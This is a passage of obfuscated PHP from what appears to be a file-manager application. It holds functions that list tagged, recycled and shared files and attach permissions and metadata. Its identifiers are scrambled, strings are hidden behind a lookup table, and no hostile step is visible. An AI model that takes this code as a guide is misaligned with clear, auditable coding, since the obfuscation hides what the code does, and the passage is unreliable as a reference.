$˝ãÜ∏Øï = array($û˘©¿á™[504] => $˝ãÜ∏Øï[$û˘©¿á™[486]], $û˘©¿á™[505] => $˝ãÜ∏Øï[$û˘©¿á™[32]], $û˘©¿á™[506] => $˝ãÜ∏Øï[$û˘©¿á™[97]], $û˘©¿á™[507] => $˝ãÜ∏Øï[$û˘©¿á™[33]], $û˘©¿á™[508] => $˝ãÜ∏Øï[$û˘©¿á™[243]], $û˘©¿á™[509] => $˝ãÜ∏Øï[$û˘©¿á™[98]]); if ($˝ãÜ∏Øï[$û˘©¿á™[33]] == $û˘©¿á™[501] && $∞Á√·™∫[$˝ãÜ∏Øï[$û˘©¿á™[97]]]) { $˝ãÜ∏Øï[$û˘©¿á™[100]] = $∞Á√·™∫[$˝ãÜ∏Øï[$û˘©¿á™[97]]]; } } unset($˝ãÜ∏Øï); return $ÿ‘©¿ü—; } public function listUserTag($‰û∞á≠á) { $ÑíÖâ–» =& $_SERVER[ˆë€Ï⁄∂]; if ($‰û∞á≠á && !is_array($‰û∞á≠á)) { $‰û∞á≠á = array($‰û∞á≠á); } $Ú…¥Ò¶ö = Model($ÑíÖâ–»[510])->listData(); $úû‡œÏ“ = array(); $òô´¬ê≠ = array(); foreach ($Ú…¥Ò¶ö as $±ËÛ€©Î) { $»Öÿãçê = $±ËÛ€©Î[$ÑíÖâ–»[97]]; if (!$»Öÿãçê) { continue; } if (!isset($òô´¬ê≠[$»Öÿãçê])) { $òô´¬ê≠[$»Öÿãçê] = array(); } $òô´¬ê≠[$»Öÿãçê][] = $±ËÛ€©Î[$ÑíÖâ–»[511]]; $úû‡œÏ“[$±ËÛ€©Î[$ÑíÖâ–»[97]]] = $±ËÛ€©Î; } $–ŒıíÊ = array(); $®∏‚±—˛ = array(); $çŸ≠«Ø° = array(); foreach ($òô´¬ê≠ as $ü∏ª˝Ê∆ => $∂â¸Íø¢) { $åéΩÄ«∫ = !0; if (!$‰û∞á≠á) { $–ŒıíÊ[] = $ü∏ª˝Ê∆; continue; } foreach ($‰û∞á≠á as $˚â«÷˚œ) { if (!in_array($˚â«÷˚œ, $∂â¸Íø¢)) { $åéΩÄ«∫ = !1; break; } } if (!$åéΩÄ«∫) { continue; } if (!is_numeric($ü∏ª˝Ê∆)) { $Æ≈Ç¨õ— = $úû‡œÏ“[$ü∏ª˝Ê∆]; $™»™≥Û§ = array($ÑíÖâ–»[32] => $Æ≈Ç¨õ—[$ÑíÖâ–»[32]], $ÑíÖâ–»[97] => $Æ≈Ç¨õ—[$ÑíÖâ–»[97]], $ÑíÖâ–»[33] => $Æ≈Ç¨õ—[$ÑíÖâ–»[33]], $ÑíÖâ–»[100] => array($ÑíÖâ–»[512] => 1), $ÑíÖâ–»[244] => !0); if ($Æ≈Ç¨õ—[$ÑíÖâ–»[33]] == $ÑíÖâ–»[242]) { $çŸ≠«Ø°[] = $™»™≥Û§; } if ($Æ≈Ç¨õ—[$ÑíÖâ–»[33]] == $ÑíÖâ–»[88]) { $®∏‚±—˛[] = $™»™≥Û§; } continue; } $–ŒıíÊ[] = $ü∏ª˝Ê∆; } if ($–ŒıíÊ) { $˙¿¸úçÜ = $this->listSource(array($ÑíÖâ–»[502] => array($ÑíÖâ–»[503], $–ŒıíÊ))); } $˙¿¸úçÜ = $˙¿¸úçÜ ? $˙¿¸úçÜ : array($ÑíÖâ–»[95] => array(), $ÑíÖâ–»[96] => array()); $˙¿¸úçÜ[$ÑíÖâ–»[95]] = array_merge($˙¿¸úçÜ[$ÑíÖâ–»[95]], $®∏‚±—˛); $˙¿¸úçÜ[$ÑíÖâ–»[96]] = array_merge($˙¿¸úçÜ[$ÑíÖâ–»[96]], $çŸ≠«Ø°); if (isset($˙¿¸úçÜ[$ÑíÖâ–»[453]]) && count($–ŒıíÊ) == $˙¿¸úçÜ[$ÑíÖâ–»[453]][$ÑíÖâ–»[454]]) { return $˙¿¸úçÜ; } $˚§≈˛∂˘ = array(); $ªãé è” = array_to_keyvalue($˙¿¸úçÜ[$ÑíÖâ–»[95]], $ÑíÖâ–»[12], $ÑíÖâ–»[203]); $Ñ˙Ïç∂¿ = array_to_keyvalue($˙¿¸úçÜ[$ÑíÖâ–»[96]], $ÑíÖâ–»[12], $ÑíÖâ–»[203]); $Ò†ÛΩÃø = array_merge($Ñ˙Ïç∂¿, $ªãé è”); foreach ($–ŒıíÊ as $»Öÿãçê) { if (!in_array($»Öÿãçê, $Ò†ÛΩÃø)) { $˚§≈˛∂˘[] = $»Öÿãçê; } } if ($˚§≈˛∂˘) { Model($ÑíÖâ–»[513])->removeBySource($˚§≈˛∂˘); } return $˙¿¸úçÜ; } public function listUserRecycle() { $¯ä∞˚˙ı =& $_SERVER[ˆë€Ï⁄∂]; $≥¨´˚¨ì = Model($¯ä∞˚˙ı[514])->listData(); if (!$≥¨´˚¨ì) { return array(); } $∑’üÜ¬˛ = array($¯ä∞˚˙ı[502] => array($¯ä∞˚˙ı[503], $≥¨´˚¨ì), $¯ä∞˚˙ı[515] => 1); return $this->listSource($∑’üÜ¬˛); } public function listSource($çñ∞ €›, $ÿ˜≈ßÆÚ = 3000, $§À§—í´ = false) { $äÌŒ¡€¢ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($çñ∞ €›[$äÌŒ¡€¢[516]])) { $çñ∞ €›[$äÌŒ¡€¢[516]] = 0; } if (isset($çñ∞ €›[$äÌŒ¡€¢[202]]) && $çñ∞ €›[$äÌŒ¡€¢[202]] == $äÌŒ¡€¢[240]) { $çñ∞ €›[$äÌŒ¡€¢[497]] = array($äÌŒ¡€¢[517], $äÌŒ¡€¢[12]); } $À≤¬áëµ = $äÌŒ¡€¢[518]; $÷£≠Ãûæ = $this->field($À≤¬áëµ)->_makeOrder()->where($çñ∞ €›)->selectPage($ÿ˜≈ßÆÚ); $this->_listPageCheck($÷£≠Ãûæ, $À≤¬áëµ, $çñ∞ €›); $this->_listDataApply($÷£≠Ãûæ[$äÌŒ¡€¢[456]], $§À§—í´); $this->_listMake($÷£≠Ãûæ); return $÷£≠Ãûæ; } private function _listPageCheck(&$öΩ‘ÉçÃ, $∫¿îå∑π, $À¯ø⁄òµ) { $ò—ƒçÌ∂ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($öΩ‘ÉçÃ[$ò—ƒçÌ∂[453]])) { return; } $ŒÏ⁄å—Ï = $öΩ‘ÉçÃ[$ò—ƒçÌ∂[453]]; if ($ŒÏ⁄å—Ï[$ò—ƒçÌ∂[455]] <= 1) { return; } if ($ŒÏ⁄å—Ï[$ò—ƒçÌ∂[454]] >= 100000) { return; } if (Model($ò—ƒçÌ∂[519])->get($ò—ƒçÌ∂[520]) != $ò—ƒçÌ∂[521]) { return; } $∫¿îå∑π = str_replace(array($ò—ƒçÌ∂[53], $ò—ƒçÌ∂[428], $ò—ƒçÌ∂[59]), $ò—ƒçÌ∂[12], $∫¿îå∑π); $∫¿îå∑π = $ò—ƒçÌ∂[522] . str_replace($ò—ƒçÌ∂[50], $ò—ƒçÌ∂[523], $∫¿îå∑π) . $ò—ƒçÌ∂[524]; $‡ó⁄—· = $ò—ƒçÌ∂[525]; $‡ó⁄—· = $‡ó⁄—· . $ò—ƒçÌ∂[526]; $ﬂ≈ıèºÏ = $ŒÏ⁄å—Ï[$ò—ƒçÌ∂[450]] * ($ŒÏ⁄å—Ï[$ò—ƒçÌ∂[439]] - 1) . $ò—ƒçÌ∂[50] . $ŒÏ⁄å—Ï[$ò—ƒçÌ∂[450]]; $µ¯§∑ß§ = $this->_makeOrder(!0); $°èπú˘º = $ò—ƒçÌ∂[522] . str_replace($ò—ƒçÌ∂[50], $ò—ƒçÌ∂[523], $µ¯§∑ß§[0]); if (strpos($°èπú˘º, $ò—ƒçÌ∂[527])) { $°èπú˘º = str_replace($ò—ƒçÌ∂[527], $ò—ƒçÌ∂[528], $°èπú˘º); } else { $°èπú˘º .= $ò—ƒçÌ∂[529] . $µ¯§∑ß§[1]; } $Ë€¸ë€î = array(); foreach ($À¯ø⁄òµ as $Ñ—¡«•Ì => $¨á∏ò≠ú) { $Ë€¸ë€î[$ò—ƒçÌ∂[522] . $Ñ—¡«•Ì] = $¨á∏ò≠ú; } $this->alias($ò—ƒçÌ∂[530])->field($∫¿îå∑π)->limit($ﬂ≈ıèºÏ)->order($°èπú˘º); $Ûﬁú∑ˆ∞ = $this->join($‡ó⁄—·)->where($Ë€¸ë€î)->select(); if ($Ûﬁú∑ˆ∞) { $öΩ‘ÉçÃ[$ò—ƒçÌ∂[456]] = $Ûﬁú∑ˆ∞; } } protected function _makeOrder($åûÓ≤Ã‰ = false) { $ŸÑôÆ‘‚ =& $_SERVER[ˆë€Ï⁄∂]; $ﬂ¸Åû°» = Model($ŸÑôÆ‘‚[531])->get($ŸÑôÆ‘‚[532]); $äü∫ö‹Á = Model($ŸÑôÆ‘‚[531])->get($ŸÑôÆ‘‚[533]); $≈œÕŸ€⁄ = array($ŸÑôÆ‘‚[534] => $ŸÑôÆ‘‚[535], $ŸÑôÆ‘‚[536] => $ŸÑôÆ‘‚[537]); $≥‘ôû‡Œ = array($ŸÑôÆ‘‚[32] => $ŸÑôÆ‘‚[32], $ŸÑôÆ‘‚[89] => $ŸÑôÆ‘‚[89], $ŸÑôÆ‘‚[179] => $ŸÑôÆ‘‚[497], $ŸÑôÆ‘‚[538] => $ŸÑôÆ‘‚[538], $ŸÑôÆ‘‚[539] => $ŸÑôÆ‘‚[540], $ŸÑôÆ‘‚[243] => $ŸÑôÆ‘‚[243], $ŸÑôÆ‘‚[98] => $ŸÑôÆ‘‚[98]); $£‘îçÿ˝ = Input::get($ŸÑôÆ‘‚[541], $ŸÑôÆ‘‚[7], $ﬂ¸Åû°», array_keys($≥‘ôû‡Œ)); $ËËøıÙ = Input::get($ŸÑôÆ‘‚[542], $ŸÑôÆ‘‚[7], $äü∫ö‹Á, array_keys($≈œÕŸ€⁄)); if (!in_array($£‘îçÿ˝, array_keys($≥‘ôû‡Œ))) { $£‘îçÿ˝ = $ŸÑôÆ‘‚[32]; } if (!in_array($ËËøıÙ, array_keys($≈œÕŸ€⁄))) { $£‘îçÿ˝ = $ŸÑôÆ‘‚[534]; } if ($£‘îçÿ˝ == $ŸÑôÆ‘‚[32]) { } $≤•ƒ¡˚ù = $ŸÑôÆ‘‚[543] . $≥‘ôû‡Œ[$£‘îçÿ˝] . $ŸÑôÆ‘‚[53] . $≈œÕŸ€⁄[$ËËøıÙ]; $≤•ƒ¡˚ù = rtrim(trim($≤•ƒ¡˚ù), $ŸÑôÆ‘‚[50]); if ($åûÓ≤Ã‰) { return array($≤•ƒ¡˚ù, $≈œÕŸ€⁄[$ËËøıÙ]); } return $this->order($≤•ƒ¡˚ù); } protected function _listDataApplyItem($ß±Ä®µ‹, $Òöπéêª = false) { $€¿ºÈ‹ = array($ß±Ä®µ‹); $this->_listDataApply($€¿ºÈ‹, $Òöπéêª); return $€¿ºÈ‹[0]; } protected function _listDataApply(&$õŒ˘üÀ¸, $Ñ≤ÎÛ¡¶ = false) { $ËÍêÉüÂ =& $_SERVER[ˆë€Ï⁄∂]; if (!$õŒ˘üÀ¸) { $õŒ˘üÀ¸ = array(); return; } $ùÆãÃÑÅ = array_to_keyvalue($õŒ˘üÀ¸, $ËÍêÉüÂ[12], $ËÍêÉüÂ[203]); $ùÆãÃÑÅ = array_unique($ùÆãÃÑÅ); $this->_listSourceCache($õŒ˘üÀ¸); if (!$Ñ≤ÎÛ¡¶) { $this->_listAppendMeta($õŒ˘üÀ¸, $ùÆãÃÑÅ); $this->_listAppendFileMeta($õŒ˘üÀ¸, $ùÆãÃÑÅ); $this->_listAppendChildren($õŒ˘üÀ¸, $ùÆãÃÑÅ); } $this->_listAppendPath($õŒ˘üÀ¸); $this->_listAppendAuth($õŒ˘üÀ¸); $this->_listAppendSourceInfo($õŒ˘üÀ¸, $ùÆãÃÑÅ); $this->_listAppendUser($õŒ˘üÀ¸); $this->_listFilterInfo($õŒ˘üÀ¸, $Ñ≤ÎÛ¡¶); $this->_listAppendAuthSecret($õŒ˘üÀ¸); } protected function _listSourceCache($ÿﬂ‹«È) { $¶èÆπß˜ =& $_SERVER[ˆë€Ï⁄∂]; foreach ($ÿﬂ‹«È as $÷…ôÑ˙Ã) { self::$cacheSourceInfo[$¶èÆπß˜[544] . $÷…ôÑ˙Ã[$¶èÆπß˜[203]]] = $÷…ôÑ˙Ã; } } protected function _listFilterInfo(&$©ÏÏ¢©ä, $ÿœ¬øÑ = false) { $°’êÔ«‹ =& $_SERVER[ˆë€Ï⁄∂]; foreach ($©ÏÏ¢©ä as &$ﬂŸâë⁄∏) { $ﬂŸâë⁄∏ = $this->pathInfoFilter($ﬂŸâë⁄∏); self::$cachePathInfo[$°’êÔ«‹[545] . intval($ÿœ¬øÑ) . $°’êÔ«‹[473] . $ﬂŸâë⁄∏[$°’êÔ«‹[203]]] = $ﬂŸâë⁄∏; } unset($ﬂŸâë⁄∏); } protected function _listMake(&$â›Í©≈À) { $âÃû ¢í =& $_SERVER[ˆë€Ï⁄∂]; $â›Í©≈À[$âÃû ¢í[95]] = array(); $â›Í©≈À[$âÃû ¢í[96]] = array(); foreach ($â›Í©≈À[$âÃû ¢í[456]] as $¬¢£®∆î) { $”ìÁ·ÂÃ = $¬¢£®∆î[$âÃû ¢í[496]] == 1 ? $âÃû ¢í[95] : $âÃû ¢í[96]; $â›Í©≈À[$”ìÁ·ÂÃ][] = $¬¢£®∆î; } unset($â›Í©≈À[$âÃû ¢í[456]]); } protected function _listAppendMeta(&$ˆÌ˘®≈ù, $ç™·Ë¯™) { $´‰’ÂÕà =& $_SERVER[ˆë€Ï⁄∂]; $Á∂Æ©ﬂÏ = array($´‰’ÂÕà[502] => array($´‰’ÂÕà[503], $ç™·Ë¯™)); $≈¥‚¡á´ = Model($´‰’ÂÕà[546])->field($´‰’ÂÕà[547])->where($Á∂Æ©ﬂÏ)->select(); if (!$≈¥‚¡á´) { return; } $ßÃπ˚•√ = array($´‰’ÂÕà[548], $´‰’ÂÕà[549], $´‰’ÂÕà[528]); $í“Û∂ÆÉ = array(); foreach ($≈¥‚¡á´ as $¥ËÖ¯ë’) { if (!isset($í“Û∂ÆÉ[$¥ËÖ¯ë’[$´‰’ÂÕà[203]]])) { $í“Û∂ÆÉ[$¥ËÖ¯ë’[$´‰’ÂÕà[203]]] = array(); } if (in_array($¥ËÖ¯ë’[$´‰’ÂÕà[107]], $ßÃπ˚•√)) { continue; } $í“Û∂ÆÉ[$¥ËÖ¯ë’[$´‰’ÂÕà[203]]][$¥ËÖ¯ë’[$´‰’ÂÕà[107]]] = $¥ËÖ¯ë’[$´‰’ÂÕà[461]]; } foreach ($ˆÌ˘®≈ù as &$‡ÚÔ∏˚¬) { $‡ÚÔ∏˚¬[$´‰’ÂÕà[550]] = !1; if (isset($í“Û∂ÆÉ[$‡ÚÔ∏˚¬[$´‰’ÂÕà[203]]])) { $‡ÚÔ∏˚¬[$´‰’ÂÕà[550]] = $í“Û∂ÆÉ[$‡ÚÔ∏˚¬[$´‰’ÂÕà[203]]]; } if ($this->fileIsLock($‡ÚÔ∏˚¬) && $‡ÚÔ∏˚¬[$´‰’ÂÕà[498]]) { $âÑ„úëÓ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $‡ÚÔ∏˚¬[$´‰’ÂÕà[498]][$´‰’ÂÕà[499]] = AuthModel::authDisable($‡ÚÔ∏˚¬[$´‰’ÂÕà[498]][$´‰’ÂÕà[499]], $âÑ„úëÓ); $‡ÚÔ∏˚¬[$´‰’ÂÕà[498]][$´‰’ÂÕà[551]][$´‰’ÂÕà[498]] = $‡ÚÔ∏˚¬[$´‰’ÂÕà[498]][$´‰’ÂÕà[499]]; } } unset($‡ÚÔ∏˚¬); } protected function _listAppendFileMeta(&$«‰Ä®®¯, $‚ÜÊ§ÖÏ) { $≠æÇáÏ =& $_SERVER[ˆë€Ï⁄∂]; $Á˘⁄≥°˘ = array_to_keyvalue($«‰Ä®®¯, $≠æÇáÏ[12], $≠æÇáÏ[552]); $Á˘⁄≥°˘ = array_filter(array_unique($Á˘⁄≥°˘)); if (!$Á˘⁄≥°˘) { return; } $»™êé∫œ = array($≠æÇáÏ[553] => array($≠æÇáÏ[503], $Á˘⁄≥°˘)); $Ü‰ÛÛ®¸ = $≠æÇáÏ[554]; $Ü¥ÿ‡Ëí = Model($≠æÇáÏ[555])->field($Ü‰ÛÛ®¸)->where($»™êé∫œ)->select(); $Ü¥ÿ‡Ëí = array_to_keyvalue($Ü¥ÿ‡Ëí, $≠æÇáÏ[552]); $‚ïü©€œ = Model($≠æÇáÏ[556])->field($≠æÇáÏ[557])->where($»™êé∫œ)->select(); $‚ïü©€œ = $‚ïü©€œ ? $‚ïü©€œ : array(); $˛å¥ù«≤ = array(); foreach ($‚ïü©€œ as $´”√∂Áı) { if (!isset($˛å¥ù«≤[$´”√∂Áı[$≠æÇáÏ[552]]])) { $˛å¥ù«≤[$´”√∂Áı[$≠æÇáÏ[552]]] = array(); } $˛å¥ù«≤[$´”√∂Áı[$≠æÇáÏ[552]]][$´”√∂Áı[$≠æÇáÏ[107]]] = $´”√∂Áı[$≠æÇáÏ[461]]; } foreach ($«‰Ä®®¯ as &$‰„ü¸‚ô) { $ü·“´¬Ω = $‰„ü¸‚ô[$≠æÇáÏ[552]]; if (!$ü·“´¬Ω || !is_array($Ü¥ÿ‡Ëí[$ü·“´¬Ω])) { continue; } $…ú¢·®´ = $Ü¥ÿ‡Ëí[$ü·“´¬Ω]; $…ú¢·®´[$≠æÇáÏ[89]] = $‰„ü¸‚ô[$≠æÇáÏ[89]]; $…ú¢·®´[$≠æÇáÏ[32]] = $‰„ü¸‚ô[$≠æÇáÏ[32]]; if (!$…ú¢·®´[$≠æÇáÏ[558]]) { Model($≠æÇáÏ[555])->fileMd5Check($…ú¢·®´); } if (!isset(self::$cacheFileInfo[$≠æÇáÏ[559] . $ü·“´¬Ω])) { self::$cacheFileInfo[$≠æÇáÏ[559] . $ü·“´¬Ω] = array_merge(array(), $…ú¢·®´); } unset($Ü¥ÿ‡Ëí[$ü·“´¬Ω][$≠æÇáÏ[97]]); $§Ö™ÅÉø = isset($˛å¥ù«≤[$ü·“´¬Ω]) && is_array($˛å¥ù«≤[$ü·“´¬Ω]) ? $˛å¥ù«≤[$ü·“´¬Ω] : array(); $‰„ü¸‚ô[$≠æÇáÏ[180]] = array_merge($§Ö™ÅÉø, $Ü¥ÿ‡Ëí[$ü·“´¬Ω]); if (isset($‰„ü¸‚ô[$≠æÇáÏ[180]][$≠æÇáÏ[194]])) { $‰„ü¸‚ô[$≠æÇáÏ[194]] = json_decode($‰„ü¸‚ô[$≠æÇáÏ[180]][$≠æÇáÏ[194]], !0); unset($‰„ü¸‚ô[$≠æÇáÏ[180]][$≠æÇáÏ[194]]); } } unset($‰„ü¸‚ô); } protected function _listAppendSourceInfo(&$‰ÓÙ¢ó÷, $ÙôòûÑÃ) { $Æâê˘äï =& $_SERVER[ˆë€Ï⁄∂]; $Á¡⁄˙’ = Model($Æâê˘äï[560])->listData(); $ŒÆÛ«…È = Model($Æâê˘äï[510])->listData(); $âù‘∑’ú = Model($Æâê˘äï[500])->listData(); $“º∑»‘π = Model($Æâê˘äï[561])->listSimple(); $˘–åº©Ã = array_to_keyvalue($Á¡⁄˙’, $Æâê˘äï[486]); $¬∫ëÙ‘Ã = array_to_keyvalue_group($ŒÆÛ«…È, $Æâê˘äï[97], $Æâê˘äï[511]); $”‚ó±†Ã = array_to_keyvalue($âù‘∑’ú, $Æâê˘äï[97]); $°ÇÊÈ‚‹ = array_to_keyvalue_group($“º∑»‘π, $Æâê˘äï[203]); foreach ($‰ÓÙ¢ó÷ as &$«•Ñ§ß‡) { $«•Ñ§ß‡[$Æâê˘äï[100]] = array($Æâê˘äï[562] => 0, $Æâê˘äï[563] => 0, $Æâê˘äï[564] => 0); if (isset($”‚ó±†Ã[$«•Ñ§ß‡[$Æâê˘äï[203]]])) { $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[565]] = 1; $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[566]] = $”‚ó±†Ã[$«•Ñ§ß‡[$Æâê˘äï[203]]][$Æâê˘äï[32]]; } if ($¬∫ëÙ‘Ã && $˘–åº©Ã && isset($¬∫ëÙ‘Ã[$«•Ñ§ß‡[$Æâê˘äï[203]]])) { $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[567]] = array(); foreach ($¬∫ëÙ‘Ã[$«•Ñ§ß‡[$Æâê˘äï[203]]] as $◊˛Â¯¯‡) { $ËÕ⁄æö˙ = $˘–åº©Ã[$◊˛Â¯¯‡]; $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[567]][] = array($Æâê˘äï[568] => $ËÕ⁄æö˙[$Æâê˘äï[486]], $Æâê˘äï[505] => $ËÕ⁄æö˙[$Æâê˘äï[32]], $Æâê˘äï[569] => $ËÕ⁄æö˙[$Æâê˘äï[570]]); } } if ($°ÇÊÈ‚‹ && isset($°ÇÊÈ‚‹[$«•Ñ§ß‡[$Æâê˘äï[203]]])) { $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[571]] = array(); foreach ($°ÇÊÈ‚‹[$«•Ñ§ß‡[$Æâê˘äï[203]]] as $¶˜‰ÉÅ¡) { $ºÆÆê´Ã = $Æâê˘äï[572]; if ($¶˜‰ÉÅ¡[$Æâê˘äï[573]] == $Æâê˘äï[101]) { $ºÆÆê´Ã .= $Æâê˘äï[574]; } $«•Ñ§ß‡[$Æâê˘äï[100]][$Æâê˘äï[571]] = array_field_key($¶˜‰ÉÅ¡, explode($Æâê˘äï[50], $ºÆÆê´Ã)); } } } unset($«•Ñ§ß‡); return $‰ÓÙ¢ó÷; } protected function _listAppendChildren(&$†Ì·†¡µ, $Üóö€∏ä) { $ˆöÑˆ€ﬁ =& $_SERVER[ˆë€Ï⁄∂]; $Ù‰≥™ÁÑ = array(); $º´˜ß®â = array($ˆöÑˆ€ﬁ[251] => 0, $ˆöÑˆ€ﬁ[252] => 0); foreach ($†Ì·†¡µ as &$ŸÉ”œ¨) { if (!$ŸÉ”œ¨[$ˆöÑˆ€ﬁ[496]]) { continue; } $Ù‰≥™ÁÑ[] = $ŸÉ”œ¨[$ˆöÑˆ€ﬁ[203]]; } unset($ŸÉ”œ¨); if (!$Ù‰≥™ÁÑ) { return; } $¥ø…í®† = array($ˆöÑˆ€ﬁ[202] => array($ˆöÑˆ€ﬁ[7], $Ù‰≥™ÁÑ), $ˆöÑˆ€ﬁ[516] => 0); $Ú÷÷«œ÷ = array($ˆöÑˆ€ﬁ[202], $ˆöÑˆ€ﬁ[496], $ˆöÑˆ€ﬁ[575] => $ˆöÑˆ€ﬁ[576]); $íÈ√ÈÁ˝ = $this->field($Ú÷÷«œ÷)->where($¥ø…í®†)->group($ˆöÑˆ€ﬁ[577])->select(); $Ø≈Ã¸√ò = array(); foreach ($íÈ√ÈÁ˝ as $≥Ûàòıﬁ) { $»ñØ˝é≤ = $≥Ûàòıﬁ[$ˆöÑˆ€ﬁ[202]]; $úÏÛôæ˝ = $≥Ûàòıﬁ[$ˆöÑˆ€ﬁ[496]] == $ˆöÑˆ€ﬁ[101] ? $ˆöÑˆ€ﬁ[252] : $ˆöÑˆ€ﬁ[251]; if (!isset($Ø≈Ã¸√ò[$»ñØ˝é≤])) { $Ø≈Ã¸√ò[$»ñØ˝é≤] = array($ˆöÑˆ€ﬁ[251] => 0, $ˆöÑˆ€ﬁ[252] => 0); } $Ø≈Ã¸√ò[$»ñØ˝é≤][$úÏÛôæ˝] += $≥Ûàòıﬁ[$ˆöÑˆ€ﬁ[576]]; } foreach ($†Ì·†¡µ as &$ŸÉ”œ¨) { if (!$ŸÉ”œ¨[$ˆöÑˆ€ﬁ[496]]) { continue; } $⁄∂˘ó€‹ = is_array($Ø≈Ã¸√ò[$ŸÉ”œ¨[$ˆöÑˆ€ﬁ[203]]]) ? $Ø≈Ã¸√ò[$ŸÉ”œ¨[$ˆöÑˆ€ﬁ[203]]] : $º´˜ß®â; $ŸÉ”œ¨[$ˆöÑˆ€ﬁ[252]] = $⁄∂˘ó€‹[$ˆöÑˆ€ﬁ[252]]; $ŸÉ”œ¨[$ˆöÑˆ€ﬁ[251]] = $⁄∂˘ó€‹[$ˆöÑˆ€ﬁ[251]]; unset($ŸÉ”œ¨[$ˆöÑˆ€ﬁ[497]]); } unset($ŸÉ”œ¨); } protected function _listAppendAuth(&$Õ®⁄¡‚ê) { $ﬁ∆™ÙãÂ =& $_SERVER[ˆë€Ï⁄∂]; $«§§‡é¢ = array(); foreach ($Õ®⁄¡‚ê as $ë”∏˝¸∑) { if ($ë”∏˝¸∑[$ﬁ∆™ÙãÂ[200]] == self::TYPE_GROUP) { $«§§‡é¢[] = $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[203]]; } } if (!$«§§‡é¢) { return; } $˝°∏ìòÉ = array_to_keyvalue($Õ®⁄¡‚ê, $ﬁ∆™ÙãÂ[203]); $…øµÉ¥≥ = Model($ﬁ∆™ÙãÂ[578])->getSourceList($«§§‡é¢, $˝°∏ìòÉ); $¯ïıÔ®≈ = KodUser::isRoot(); foreach ($Õ®⁄¡‚ê as $â∞õ˝å => &$ë”∏˝¸∑) { $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]] = $…øµÉ¥≥[$ë”∏˝¸∑[$ﬁ∆™ÙãÂ[203]]]; if (!$ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]] && $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[200]] == self::TYPE_GROUP) { $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]] = Action($ﬁ∆™ÙãÂ[579])->pathGroupAuthMake($ë”∏˝¸∑[$ﬁ∆™ÙãÂ[580]]); if (!$ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]] && !$¯ïıÔ®≈) { $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[245]] = !1; $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[244]] = !1; } } if ($ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]]) { $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[245]] = AuthModel::authCheckEdit($ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]][$ﬁ∆™ÙãÂ[499]]); $ë”∏˝¸∑[$ﬁ∆™ÙãÂ[244]] = AuthModel::authCheckView($ë”∏˝¸∑[$ﬁ∆™ÙãÂ[498]][$ﬁ∆™ÙãÂ[499]]); } $this->groupPathDisplay($ë”∏˝¸∑); } unset($ë”∏˝¸∑); } public function _listAppendAuthSecret(&$§∏«ÂÙà) { $›• ≥Èæ =& $_SERVER[ˆë€Ï⁄∂]; if (Model($›• ≥Èæ[519])->get($›• ≥Èæ[581]) != $›• ≥Èæ[101]) { return; } static $∂î£±ƒ¥ = false; if (!$∂î£±ƒ¥) { $Â‰»Çœª = Model($›• ≥Èæ[582]); $ˆÇãı˘º = Model($›• ≥Èæ[583]); $∂î£±ƒ¥ = $ˆÇãı˘º->listData(); $∂î£±ƒ¥ = array_to_keyvalue($∂î£±ƒ¥, $›• ≥Èæ[203]); $¯ﬂÆ≤Ÿ˝ = json_decode(Model($›• ≥Èæ[519])->get($›• ≥Èæ[584]), !0); $¯ﬂÆ≤Ÿ˝ = array_to_keyvalue($¯ﬂÆ≤Ÿ˝, $›• ≥Èæ[486]); foreach ($∂î£±ƒ¥ as $û°˙≥Œ• => $´˝ñ–˙) { $ –õüüÈ = $¯ﬂÆ≤Ÿ˝[$´˝ñ–˙[$›• ≥Èæ[585]]]; if (!$ –õüüÈ) { $ˆÇãı˘º->remove($´˝ñ–˙[$›• ≥Èæ[486]]); unset($∂î£±ƒ¥[$û°˙≥Œ•]); continue; } $Óû‘ÉÌË = $Â‰»Çœª->listData($ –õüüÈ[$›• ≥Èæ[498]]); if (!$Óû‘ÉÌË) { $ˆÇãı˘º->remove($´˝ñ–˙[$›• ≥Èæ[486]]); unset($∂î£±ƒ¥[$û°˙≥Œ•]); continue; } $´˝ñ–˙[$›• ≥Èæ[498]] = $Óû‘ÉÌË; $´˝ñ–˙[$›• ≥Èæ[586]] = $ –õüüÈ; $´˝ñ–˙[$›• ≥Èæ[587]] = Model($›• ≥Èæ[588])->getInfoSimpleOuter($´˝ñ–˙[$›• ≥Èæ[538]]); $∂î£±ƒ¥[$û°˙≥Œ•] = $´˝ñ–˙; } } $›≤Æó™ = USER_ID; $Å˚ö…áô = array(); $ò“ÅÑªº = $this->_listAppendPath($Å˚ö…áô, !0); foreach ($§∏«ÂÙà as $û°˙≥Œ• => &$´˝ñ–˙) { if (!is_array($´˝ñ–˙[$›• ≥Èæ[498]])) { continue; } if ($´˝ñ–˙[$›• ≥Èæ[200]] != $›• ≥Èæ[589]) { continue; } if (isset($∂î£±ƒ¥[$´˝ñ–˙[$›• ≥Èæ[203]]])) { $«÷Ò¯øà = $∂î£±ƒ¥[$´˝ñ–˙[$›• ≥Èæ[203]]]; if (!is_array($´˝ñ–˙[$›• ≥Èæ[550]])) { $´˝ñ–˙[$›• ≥Èæ[550]] = array(); } $´˝ñ–˙[$›• ≥Èæ[550]][$›• ≥Èæ[590]] = $«÷Ò¯øà[$›• ≥Èæ[585]]; $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[591]] = $«÷Ò¯øà; $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[592]] = $´˝ñ–˙[$›• ≥Èæ[593]]; $´˝ñ–˙[$›• ≥Èæ[498]][$›• ≥Èæ[594]] = $›• ≥Èæ[101]; if 